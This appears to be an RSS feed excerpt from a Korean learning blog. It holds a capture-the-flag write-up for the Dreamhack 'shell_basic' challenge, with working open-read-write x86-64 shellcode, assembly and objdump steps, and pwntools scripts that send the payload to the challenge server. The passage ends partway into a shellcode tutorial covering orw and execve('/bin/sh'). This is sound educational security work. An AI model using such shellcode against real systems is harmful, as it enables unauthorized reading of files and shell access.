  &lt;li&gt;이번 스테이지는 문제를 자율적으로 풀어보는 스테이지이다.&lt;/li&gt;
  &lt;li&gt;직전 스테이지에서 문제를 해결했던 방식으로 접근하며 문제 풀이 사고방식을 체화하는 것을 목표로 삼았다.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;문제-풀이-과정-설정하기&quot;&gt;문제 풀이 과정 설정하기&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;코드의 내용 확인&lt;/li&gt;
  &lt;li&gt;익스플로잇 가능 부분 확인&lt;/li&gt;
  &lt;li&gt;익스플로잇 당시의 스택 구조 체크&lt;/li&gt;
  &lt;li&gt;페이로드 초안 작성&lt;/li&gt;
  &lt;li&gt;익스플로잇 코드 작성&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-1-코드의-내용-확인&quot;&gt;1. (1) 코드의 내용 확인&lt;/h1&gt;

&lt;p&gt;입력한 셸코드를 실행하는 프로그램이다. 맨 처음에는 문제에서 미리 설명해준 것을 이해하지 못하고 BOF를 쓰는 걸까? 싶었지만 코드를 찬찬히 읽어보니 그냥 내가 입력한 셸코드를 실행해 주는 프로그램이었다….&lt;/p&gt;

&lt;p&gt;따라서 모두 뛰어넘고 5번을 수행하면 되겠다.&lt;/p&gt;

&lt;h1 id=&quot;2-5-익스플로잇-코드-작성&quot;&gt;2. (5) 익스플로잇 코드 작성&lt;/h1&gt;

&lt;p&gt;내가 원하는 동작을 정리해 보자.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;cat /home/shell_basic/flag_name_is_loooooong&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;그런데 cat을 실행하려면 쉘을 먼저 따야 한다. 즉, 쉘을 띄운다 → cat을 수행한다의 과정을 거쳐야 한다.  그러나, 쉘을 띄우는 과정에서 현재 내 수준으로는 무조건 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execveat&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt; 등의 함수를 사용해야 하는데 코드 상에서도 그렇고, 문제 설명 상에서도 그렇고 main 함수 내부에서 해당 함수를 호출하는 것이 아니라면 실행 권한이 없게 설정되어 있다. 따라서 다른 방식을 찾아야 한다.&lt;/p&gt;

&lt;p&gt;두 번째 가능한 방법으로는 read/write 시스템 콜을 이용하는 것이다. 먼저 주어진 플래그의 경로에 있는 파일의 내용을 읽어온 후, 터미널에 write 하도록 하는 것이다. 직전에 만들어 보았던 orw 셸코드와 크게 차이가 있지는 않다.&lt;/p&gt;

&lt;p&gt;어셈블리어로 먼저 작성한 후, 기계어로 변환한 값을 넣어야 주어진 코드가 실행할 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위의 사진과 같이 선언된 부분에 내가 작성한 코드가 올라가고, 해당 코드의 시작 부분부터 종료까지를 실행하는 구조이기 때문이다.(나도 태어나서 이런 식으로 포인터 자료형을 바꾸어 데이터를 코드로 읽게끔 하는 플로우는 처음 보았기 때문에, 코드를 이해하며 많이 배웠다)&lt;/p&gt;

&lt;h2 id=&quot;어셈블리어로-작성하기&quot;&gt;어셈블리어로 작성하기&lt;/h2&gt;

&lt;p&gt;그럼 먼저 원하는 동작을 어셈블리어로 작성해 보자.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;우리가 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2/#/&quot;&gt;여기&lt;/a&gt;에서 배웠던 text segment는 다른 말로 code segment라고도 한다. 즉, 아래의 어셈블리 코드는 실행할 수 있는 인스트럭션이 탑재되는 주소에 다이렉트로 접근하면서 시작한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;
BITS 64
section .text ; text 섹션에 올라가는 것이므로
global _start ; NASM에게 시작 위치가 무엇으로 마킹되었는지를 알려준다

_start: 
; input string into the stack
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

; open(&quot;/home/shell_basic/flag_name_is_loooooong&quot;, O_RDONLY, NULL)
mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

; read(fd, buf, 0x40)
mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

; write(1, buf, 0x40)
mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

; terminate the program
xor rdi, rdi
mov rax, 0x3c
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;“gnooooool_si_eman_galf/cisab_llehs/emoh/”을 hex로 변환하면:&lt;/p&gt;

    &lt;p&gt;676e6f6f6f6f6f6f 6c5f73695f656d61 6e5f67616c662f63 697361625f6c6c65 68732f656d6f682f&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;40byte이므로 한 번에 넣을 수가 없다. 8byte씩 5회에 나누어 레지스터에 넣고 스택에 push 해주는 과정을 거쳐야 한다.&lt;/li&gt;
  &lt;li&gt;스택에 들어간 텍스트 등의 데이터는 작은 주소에서 큰 주소로 읽고, 마지막의 한 chunk가(이 경우 8 byte) 8byte를 전부 채우지 못했을 경우 시스템은 거기에서 데이터가 끝났다고 인식한다고 추정했다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;기계어로-변환하기&quot;&gt;기계어로 변환하기&lt;/h2&gt;

&lt;p&gt;.asm 파일을 .o 파일로 변환하고, 이후 .bin 파일로 변환하여 해당 바이너리 값을 hex로 변환한다.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elf64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.asm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disassemble&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objcopy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dump-section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell_basic.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell_basic.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%201.jpeg&quot; alt=&quot;마지막 명령어까지 수행한 결과. hex값이 출력되었다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;마지막 명령어까지 수행한 결과. hex값이 출력되었다.&lt;/p&gt;

&lt;p&gt;그렇게 나온 hex값을 쉘코드 형태로 가공해 입력해 보았다. 그 결과,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%202.jpeg&quot; alt=&quot;아니 외않되&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아니 외않되&lt;/p&gt;

&lt;p&gt;안 되는 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;그렇다면 왜 안되는 것일까? 그 이유를 gdb를 붙여 알아보았다. 확인 결과, 내가 읽어오길 원하는 파일의 경로를 스택에 분명히 끊이지 않도록 잘 넣었음에도 불구하고 스택의 한 주소(8byte)만큼만 스트링을 읽어오는 것을 볼 수 있었다.&lt;/p&gt;

&lt;h1 id=&quot;3-문제-수정&quot;&gt;3. 문제 수정&lt;/h1&gt;

&lt;h2 id=&quot;1-null-byte&quot;&gt;#1. NULL Byte&lt;/h2&gt;

&lt;p&gt;앞서 알아낸 바에 따르면, 현재 원하는 경로를 스택에 잘 넣었음에도 불구하고 경로 문자열 전체를 인식하지 못하는 문제가 있었다. 분명히 시스템 상으로 어떤 문자열이 있다면 그 끝을 인지하고, 문자열을 올바르게 불러오는 장치가 있을 것이라 생각했다. 그렇지 않다는 것은 굉장히 비논리적이기 때문이었다.&lt;/p&gt;

&lt;p&gt;만일 그러한 장치가 없다고 가정해 보자. 그렇다면 파일 경로 이름은 8bytes로 제한될 것이고, C 언어 상에서 문자열을 저장하고 불러오는 것은 원천적으로 불가능할 것이다.&lt;/p&gt;

&lt;p&gt;여기까지 생각하니 생각나는 것이 있었다. 바로 C언어의 경우 문자열의 끝에 NULL 문자를 덧붙여 문자열의 끝을 표현한다는 점이었다. 따라서 해당 가설이 맞는지 스택에 가장 먼저 0x00 (ASCII 문자의 0번은 NULL byte이다)를 넣어두고 이하 원하는 값을 넣었다. 스택에 들어가는 값은 큰 주소부터 들어가고, 스택은 작은 주소부터 읽기 때문에 스택에 push 하는 값이 뒤집힌다는 점을 고려한 순서 지정이었다.&lt;/p&gt;

&lt;p&gt;따라서 해당 가설을 반영한 어셈블리어 코드는 아래와 같았다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;
BITS 64
section .text ; text 섹션에 올라가는 것이므로
global _start ; NASM에게 시작 위치가 무엇으로 마킹되었는지를 알려준다

_start: 
; input string into the stack
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
.
.
.
(이하 상동)
.
.
.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;해당 어셈블리어를 어셈블한 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;해당 결과를 파이프를 이용해 텍스트 파일에 저장하고, 쉘코드 형태로 가공한 후 원격 서버에 입력해 보았다.&lt;/p&gt;

&lt;p&gt;그 결과,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%204.jpeg&quot; alt=&quot;아외또않되&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아외또않되&lt;/p&gt;

&lt;p&gt;안된다… C 언어로 짠 스켈레톤 코드에 올려서 gdb를 붙여서 확인해 봤는데, 분명히 제대로 되고 있었다. 심지어 flag 파일의 경로에 해당 파일을 만들어서 컴파일된 프로그램을 돌려 보았더니 제대로 파일의 값이 읽혀 나왔던 것까지 확인했는데 말이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack42/Untitled%205.jpeg&quot; alt=&quot;로컬 환경에서는 제대로 되는 모습을 확인.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;로컬 환경에서는 제대로 되는 모습을 확인.&lt;/p&gt;

&lt;h2 id=&quot;2-pwntools&quot;&gt;#2. Pwntools&lt;/h2&gt;
&lt;p&gt;그러다가 갑자기 생각났다. 설마, 프로그램 상에서 바이너리로 패킹해서 보내줘야 하는 걸까? 왠지 그럴 것 같았다. 네트워크를 통해 데이터가 전송될 경우 엔디안을 고려하지 않으면 원했던 것과는 정반대의 바이트가 갈 수 있다는 것을 BoB 수업 시간 때 배웠던 기억이 있었기 때문이었다.&lt;/p&gt;

&lt;p&gt;그래서 python을 이용해 내가 원하는 데이터를 원격으로 보내고, 그 결과를 받는 프로그램을 짰다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\xb8\x00\x00\x00\x00\x41\x50\x49\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x41\x50\x49\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x41\x50\x49\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x41\x50\x49\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x41\x50\x49\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x41\x50\x48\x89\xe7\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x8d\x74\x24\xc0\xba\x40\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x8d\x74\x24\xc0\xba\x30\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;host3.dreamhack.games&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그 결과, 성공했다! 경로가 지정하는 파일을 읽어 와 플래그를 확인할 수 있었다. 여기에 플래그는 올리지 않을 것이다. 드림핵에서 동일 문제를 푸는 사람들에게 스포일러가 될 수도 있기에…&lt;/p&gt;

&lt;p&gt;또 다른 방식으로 코드를 짤 수 있을까 싶어 두 번째 방법도 제안해 본다. 이 또한 플래그를 가져올 수 있는 코드였다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;amd64&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
_start: 
mov r8, 0x00
push r8
mov r8, 0x676e6f6f6f6f6f6f
push r8
mov r8, 0x6c5f73695f656d61
push r8
mov r8, 0x6e5f67616c662f63
push r8
mov r8, 0x697361625f6c6c65 
push r8
mov r8, 0x68732f656d6f682f
push r8

mov rdi, rsp
xor rsi, rsi
mov rax, 0x02
syscall

mov rdi, rax
lea rsi, [rsp-0x40]
mov rdx, 0x40
mov rax, 0x00
syscall

mov rdi, 0x01
lea rsi, [rsp-0x40]
mov rdx, 0x30
mov rax, 0x01
syscall

xor rdi, rdi
mov rax, 0x3c
syscall
&apos;&apos;&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;host3.dreamhack.games&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;내가 작성한 어셈블리 코드를 굳이 힘들게 쉘코드로 변환할 필요가 없어서 효율적이라 느낀 코드였다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;4-앞으로-고칠-점&quot;&gt;4. 앞으로 고칠 점&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;익스플로잇을 만들고 나서, 로컬 환경 대상으로 gdb를 돌려볼 것.
    &lt;ul&gt;
      &lt;li&gt;비슷한 과정을 반복할 필요가 없으므로 문제 풀이 시간이나 피드백 시간이 훨씬 단축될 것이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;원격 환경에 셸코드 등의 바이너리를 보낼 땐 반드시 pwntools의 send()를 사용할 것.
    &lt;ul&gt;
      &lt;li&gt;제발 제발 제발 직접 입력하지 말고 프로그램을 이용하자.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Thu, 28 Jul 2022 10:08:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step4-2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step4-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 4</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-4&quot; id=&quot;markdown-toc-stage-4&quot;&gt;STAGE 4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#exploit-tech-shellcode&quot; id=&quot;markdown-toc-exploit-tech-shellcode&quot;&gt;Exploit Tech: ShellCode&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#셸코드란&quot; id=&quot;markdown-toc-셸코드란&quot;&gt;셸코드란?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#orw-셸코드&quot; id=&quot;markdown-toc-orw-셸코드&quot;&gt;orw 셸코드&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#셸코드-작성하기&quot; id=&quot;markdown-toc-셸코드-작성하기&quot;&gt;셸코드 작성하기&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#1-int-fd--opentmpflag-o_rdonly-null&quot; id=&quot;markdown-toc-1-int-fd--opentmpflag-o_rdonly-null&quot;&gt;1. int fd = open(”/tmp/flag”, O_RDONLY, NULL)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#2-readfd-buf-0x30&quot; id=&quot;markdown-toc-2-readfd-buf-0x30&quot;&gt;2. read(fd, buf, 0x30)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#3-write1-buf-0x30&quot; id=&quot;markdown-toc-3-write1-buf-0x30&quot;&gt;3. write(1, buf, 0x30)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#4-정말-중요한-이야기-헷갈리지-말자-rsp-rbp의-의미&quot; id=&quot;markdown-toc-4-정말-중요한-이야기-헷갈리지-말자-rsp-rbp의-의미&quot;&gt;4. 정말 중요한 이야기-헷갈리지 말자! (rsp, rbp의 의미)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#5-종합&quot; id=&quot;markdown-toc-5-종합&quot;&gt;5. 종합&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#orw-셸코드-컴파일-및-실행&quot; id=&quot;markdown-toc-orw-셸코드-컴파일-및-실행&quot;&gt;orw 셸코드 컴파일 및 실행&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#execve-셸코드&quot; id=&quot;markdown-toc-execve-셸코드&quot;&gt;execve 셸코드&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#execvebinsh-null-null&quot; id=&quot;markdown-toc-execvebinsh-null-null&quot;&gt;execve(”/bin/sh”, null, null)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#objdump를-이용한-shellcode-추출&quot; id=&quot;markdown-toc-objdump를-이용한-shellcode-추출&quot;&gt;objdump를 이용한 shellcode 추출&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-4&quot;&gt;STAGE 4&lt;/h1&gt;

&lt;h1 id=&quot;exploit-tech-shellcode&quot;&gt;Exploit Tech: ShellCode&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;시스템 해킹의 익스플로잇 기법 첫 번째: Shell Code&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;셸코드 개념&lt;/li&gt;
    &lt;li&gt;orw(open-read-write, 파일 읽고 쓰기) 셸코드 작성 및 디버깅&lt;/li&gt;
    &lt;li&gt;execve 셸코드 작성&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;셸코드란&quot;&gt;셸코드란?&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;익스플로잇을 수행하기 위해 제작된 어셈블리어 코드 조각&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;일반적으로 셸을 획득하기 위해 사용되어서 “셸”이 붙음&lt;/li&gt;
    &lt;li&gt;또한 그만큼 셸 획득은 시스템 해킹의 관점에서 매우 중요하다!&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;여기&lt;/a&gt;에서 예제를 풀면서 확인했듯, &lt;strong&gt;rip를 내가 실행하고 싶은 코드의 주소로 옮긴다면 원하는 코드가 실행되게끔 할 수 있다.&lt;/strong&gt; 특히 어셈블리어는 architecture dependency가 있으나 일단 알맞게만 작성한다면 기계어와 무조건 호환되므로 어셈블리어로 작성한 코드는 어셈블만 거쳐 곧장 CPU의 동작에 적용된다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;셸코드를 작성할 때의 주의사항:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;익스플로잇 대상 아키텍처와 운영체제, 그리고 목적을 모두 고려하며 작성한다.&lt;/li&gt;
  &lt;li&gt;실행될 당시의 메모리 상태를 적절히 반영한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/&quot;&gt;자주 사용되는 셸코드가 공유된 사이트&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;범용적으로 작성된 것이므로 실행 당시의 메모리 상태를 반영하지는 못한다.&lt;/li&gt;
  &lt;li&gt;따라서 셸코드는 일반적으로 직접 작성해야 한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;orw-셸코드&quot;&gt;orw 셸코드&lt;/h1&gt;

&lt;p&gt;/tmp/flag를 읽을 수 있는 셸코드 작성하기&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;orw 셸코드: open-read-write 셸코드의 준말로, 파일을 열어서 읽은 뒤 화면에 출력해 주는 셸코드이다.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;셸코드는 보통 syscall을 사용하기 때문에, 셸코드 작성 전에 어떤 syscall이 익스플로잇에 필요한지 미리 생각해 두면 좋다.&lt;/li&gt;
    &lt;li&gt;구현하고 싶은 셸코드를 pseudo-code로 먼저 표현해 보자. 아무 형식이어도 괜찮지만 고급 언어 중에서도 레벨이 낮은 편인 C 언어 형식으로 표현하면 조금 더 편하다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//flag 파일에 있는 글자수만큼+1의 버퍼 만들어 주기&lt;/span&gt;
